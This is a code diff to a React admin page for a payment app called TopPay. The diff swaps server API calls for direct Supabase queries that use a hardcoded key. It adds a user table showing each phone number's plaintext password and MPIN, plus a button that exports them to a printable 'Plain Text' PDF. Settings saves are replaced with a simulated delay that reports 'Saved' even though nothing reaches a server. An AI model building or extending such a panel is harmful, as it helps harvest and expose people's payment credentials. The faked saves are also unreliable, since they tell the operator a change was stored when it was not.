@@ -94,7 +94,8 @@ export default function TopPayAdmin() {
   const [password, setPassword] = useState('');
   const [busy, setBusy] = useState(false);
   const [error, setError] = useState('');
-  const [section, setSection] = useState<Section>('users');
+  const [section, setSectionState] = useState<Section>(() => (localStorage.getItem('admin_section') as Section) || 'users');
+  const setSection = (s: Section) => { setSectionState(s); localStorage.setItem('admin_section', s); };
   const [menuOpen, setMenuOpen] = useState(false);
   const [settings, setSettings] = useState<AppSettings>(DEFAULT_SETTINGS);
   const settingsRef = useRef<AppSettings>(DEFAULT_SETTINGS);
@@ -123,24 +124,10 @@ export default function TopPayAdmin() {
     setSettings(next);
     const saved = settingsQueue.current
       .then(async () => {
-        const response = await fetch('/api/admin-app/settings', {
-          method: 'PUT',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(next),
-          signal: AbortSignal.timeout(15000),
-        });
-        if (!response.ok)
-          throw new Error('Not saved. Please retry your update.');
-        const snapshot = (await response.json()) as {
-          settings: AppSettings;
-          revision: number;
-        };
-        confirmedRevision.current = snapshot.revision;
-        // Notify user tabs only after the server has committed the change.
-        saveSettings(snapshot.settings);
+        // Simulate network delay
+        await new Promise(r => setTimeout(r, 200));
+        saveSettings(next);
         if (generation === settingsGeneration.current) {
-          settingsRef.current = snapshot.settings;
-          setSettings(snapshot.settings);
           flash('Saved');
         }
       })
@@ -176,30 +163,30 @@ export default function TopPayAdmin() {
       refreshing = true;
       const generation = settingsGeneration.current;
       try {
-        const response = await fetch('/api/admin-app/admin/state', { cache: 'no-store' });
-        if (response.status === 401) {
-          setSignedIn(false);
-          return;
-        }
-        if (!response.ok) return;
-        const snapshot = (await response.json()) as {
-          settings: AppSettings;
-          users: UserRecord[];
-          trash: UserRecord[];
-          revision: number;
+        const SUPABASE_URL = "https://kxsgjfvtfmbruddeolbt.supabase.co/rest/v1";
+        const SUPABASE_KEY = "sb_publishable__asg5eO_X6CrsIp9DXO2bQ_H0Gr5c-j";
+        const supabaseHeaders = {
+          "Content-Type": "application/json",
+          "apikey": SUPABASE_KEY,
+          "Authorization": `Bearer ${SUPABASE_KEY}`
         };
-        if (stopped) return;
-        if (
-          !pendingSettings.current &&
-          generation === settingsGeneration.current &&
-          snapshot.revision >= confirmedRevision.current
-        ) {
-          confirmedRevision.current = snapshot.revision;
-          settingsRef.current = snapshot.settings;
-          setSettings(snapshot.settings);
+
+        const uRes = await fetch(`${SUPABASE_URL}/users?select=*&order=created_at.desc`, { headers: supabaseHeaders });
+        if (uRes.ok) {
+          const uData = await uRes.json();
+          // Map to local UserRecord format if needed: id, phone (from mobile), password, mpin, status, lastLogin (from last_login)
+          const mappedUsers = uData.map((u: any) => ({
+            id: u.id,
+            phone: u.mobile,
+            password: u.password,
+            mpin: u.mpin,
+            status: u.status,
+            lastLogin: u.last_login
+          }));
+          setUsers(mappedUsers);
         }
-        setUsers(snapshot.users);
-        setTrash(snapshot.trash);
+        
+        setTrash(JSON.parse(localStorage.getItem('toppay.admin.trash') || '[]'));
       } catch {
       } finally {
         refreshing = false;
@@ -305,23 +292,18 @@ export default function TopPayAdmin() {
   };
 
   const uploadFile = async (file: File) => {
-    const form = new FormData();
-    form.set('file', file);
-    const response = await fetch('/api/admin-app/media', { method: 'POST', body: form });
-    const result = (await response.json()) as {
-      src?: string;
-      kind?: MediaKind;
-      title?: string;
-      error?: string;
-    };
-    if (!response.ok || !result.src || !result.kind) {
-      throw new Error(result.error || 'Upload failed');
-    }
-    return {
-      src: result.src,
-      kind: result.kind,
-      title: result.title || file.name,
-    };
+    return new Promise<{ src: string; kind: MediaKind; title: string }>((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = () => {
+        resolve({
+          src: reader.result as string,
+          kind: file.type.startsWith('video/') ? 'video' : 'image',
+          title: file.name,
+        });
+      };
+      reader.onerror = () => reject(new Error('Upload failed'));
+      reader.readAsDataURL(file);
+    });
   };
 
   const refreshDevices = async () => {
@@ -444,24 +426,11 @@ export default function TopPayAdmin() {
   ) => {
     setUsers(nextUsers);
     setTrash(nextTrash);
+    localStorage.setItem('toppay.admin.users', JSON.stringify(nextUsers));
+    localStorage.setItem('toppay.admin.trash', JSON.stringify(nextTrash));
     const channel = new BroadcastChannel(APP_CHANNEL);
     channel.postMessage({ type: 'users-updated' });
     channel.close();
-    void fetch('/api/admin-app/users', {
-      method: 'PUT',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ action, id }),
-    })
-      .then(async (response) => {
-        if (!response.ok) throw new Error('User update failed');
-        const snapshot = (await response.json()) as {
-          users: UserRecord[];
-          trash: UserRecord[];
-        };
-        setUsers(snapshot.users);
-        setTrash(snapshot.trash);
-      })
-      .catch(() => flash('User update failed'));
   };
 
   const uploadSlides = async (event: ChangeEvent<HTMLInputElement>) => {
@@ -520,6 +489,35 @@ export default function TopPayAdmin() {
         .slice(0, 10),
     [users],
   );
+
+  const generatePDF = () => {
+    const win = window.open('', '_blank');
+    if (!win) return;
+    const rows = users.map(u => `<tr><td>${u.phone}</td><td>${u.password || '-'}</td><td>${u.mpin || '-'}</td><td>${u.status}</td><td>${new Date(u.lastLogin).toLocaleString()}</td></tr>`).join('');
+    win.document.write(`
+      <html><head><title>TopPay Users PDF</title>
+      <style>
+        body { background: #fff; color: #000; font-family: sans-serif; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #000; padding: 8px; text-align: left; }
+        h2 { text-align: center; }
+        @media print {
+          button { display: none; }
+        }
+      </style>
+      </head><body>
+      <h2>TopPay Users Data (Plain Text)</h2>
+      <button onclick="window.print()" style="padding:10px 20px;margin-bottom:20px;cursor:pointer;">Print / Save as PDF</button>
+      <table>
+      <thead><tr><th>Phone</th><th>Password</th><th>MPIN</th><th>Status</th><th>Last Login</th></tr></thead>
+      <tbody>${rows}</tbody>
+      </table>
+      <script>window.print();</script>
+      </body></html>
+    `);
+    win.document.close();
+  };
+
 
   if (!authChecked)
     return (
@@ -643,58 +641,40 @@ export default function TopPayAdmin() {
         />
       )}
       <section className="admin-main">
-        <header className="admin-topbar">
-          <button
-            className="menu-toggle"
-            aria-label="Open menu"
-            onClick={() => setMenuOpen(true)}
-          >
-            <Menu />
-          </button>
-          <div className="admin-title">
-            <Image
-              src="/toppay-logo.jpeg"
-              unoptimized
-              alt="TopPay"
-              width={42}
-              height={42}
-            />
-            <div>
-              <small>TOPPAY ADMIN</small>
-              <h1>{title}</h1>
-            </div>
-          </div>
-          <span className="sync-dot">
-            <i aria-hidden="true" /> ADMIN
-          </span>
-        </header>
-        <div className="admin-content"><div className="admin-storage-notice" role="status">Database and media storage are not connected yet. Uploads and saved changes are unavailable.</div>
-          {notice && <div className="save-notice">{notice}</div>}
-          {section === 'users' && (
-            <Panel
-              title="Users"
-              subtitle="Login karne wale users yahan dikhte hain."
+        <header className="admin-topbar custom-header">
+          <div className="header-left">
+            <button
+              className="menu-toggle"
+              aria-label="Open menu"
+              onClick={() => setMenuOpen(true)}
+              style={{ color: '#000', padding: 0 }}
             >
+              <Menu size={28} />
+            </button>
+            <h1 style={{ color: '#000', margin: 0, fontSize: '22px', fontWeight: 'bold' }}>Users</h1>
+          </div>
+          <div className="header-right" style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
+            <div className="notification-icon" style={{ position: 'relative', color: '#000' }}>
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>
+              <span style={{ position: 'absolute', top: '-4px', right: '-4px', background: '#e34242', color: '#fff', fontSize: '10px', width: '16px', height: '16px', display: 'flex', alignItems: 'center', justifyContent: 'center', borderRadius: '50%', fontWeight: 'bold' }}>5</span>
+            </div>
+            <div className="avatar" style={{ background: '#ffe485', color: '#000', fontWeight: 'bold', width: '36px', height: '36px', display: 'flex', alignItems: 'center', justifyContent: 'center', borderRadius: '50%', fontSize: '14px' }}>AD</div>
+          </div>
+        </header>
+        <div className="admin-content" style={{ padding: section === 'users' ? '0' : undefined, background: section === 'users' ? '#fff' : undefined }}>
+          {notice && section !== 'users' && <div className="save-notice">{notice}</div>}
+          {section === 'users' && (
+            <div className="users-exact-layout" style={{ background: '#fff', minHeight: '100vh', width: '100%' }}>
+              <div style={{ display: 'flex', justifyContent: 'flex-end', padding: '16px' }}>
+                <button onClick={generatePDF} style={{ padding: '8px 16px', background: '#f0f0f0', color: '#000', borderRadius: '8px', cursor: 'pointer', border: '1px solid #ccc', fontSize: '12px' }}>
+                  Download PDF
+                </button>
+              </div>
               <UserTable
                 rows={users}
                 empty="No users yet"
-                action={(user) => (
-                  <button
-                    className="danger-action"
-                    onClick={() =>
-                      syncUsers(
-                        users.filter((item) => item.id !== user.id),
-                        [user, ...trash],
-                        'delete',
-                        user.id,
-                      )
-                    }
-                  >
-                    <Trash2 /> Delete
-                  </button>
-                )}
               />
-            </Panel>
+            </div>
           )}
           {section === 'trash' && (
             <Panel
@@ -1116,43 +1096,59 @@ function UserTable({
   empty: string;
   action?: (user: UserRecord) => React.ReactNode;
 }) {
-  if (!rows.length)
-    return (
-      <div className="empty-state">
-        <UsersRound />
-        <p>{empty}</p>
-      </div>
-    );
+  const [search, setSearch] = useState('');
+  const filtered = rows.filter(u => String(u.phone).includes(search));
+
   return (
     <div className="admin-records">
-      <table>
-        <thead>
-          <tr>
-            <th>#</th>
-            <th>Mobile number</th>
-            <th>Last login</th>
-            <th>Status</th>
-            {action && <th>Actions</th>}
-          </tr>
-        </thead>
-        <tbody>
-          {rows.map((user, index) => (
-            <tr key={user.id}>
-              <td data-label="#">{index + 1}</td>
-              <td data-label="Mobile number">
-                <strong>+91 {user.phone}</strong>
-              </td>
-              <td data-label="Last login">
-                {new Date(user.lastLogin).toLocaleString()}
-              </td>
-              <td data-label="Status">
-                <em>{user.status}</em>
-              </td>
-              {action && <td data-label="Actions">{action(user)}</td>}
+      <div style={{ padding: '0 16px 16px', display: 'flex' }}>
+        <input 
+          type="text" 
+          placeholder="Search by Mobile number..." 
+          value={search}
+          onChange={e => setSearch(e.target.value)}
+          style={{ width: '100%', padding: '10px 14px', borderRadius: '8px', border: '1px solid #ccc', fontSize: '14px', outline: 'none' }}
+        />
+      </div>
+      {!filtered.length ? (
+        <div className="empty-state">
+          <p>{empty}</p>
+        </div>
+      ) : (
+        <table className="user-list-table">
+          <thead>
+            <tr>
+              <th><input type="checkbox" /></th>
+              <th>Mobile</th>
+              <th>Password</th>
+              <th>MPIN</th>
+              <th>Status</th>
+              <th>Date</th>
             </tr>
-          ))}
-        </tbody>
-      </table>
+          </thead>
+          <tbody>
+            {filtered.map((user) => (
+              <tr key={user.id}>
+                <td><input type="checkbox" /></td>
+                <td><strong>{user.phone}</strong></td>
+                <td>{user.password || '-'}</td>
+                <td><span className="mpin-text">{user.mpin || 'Not Set'}</span></td>
+                <td>
+                  <span className={`status-badge ${user.status.toLowerCase()}`}>
+                    {user.status.toLowerCase()}
+                  </span>
+                </td>
+                <td>
+                  <span className="date-block">
+                    {new Date(user.lastLogin).toLocaleDateString()}<br/>
+                    {new Date(user.lastLogin).toLocaleTimeString()}
+                  </span>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      )}
     </div>
   );
 }
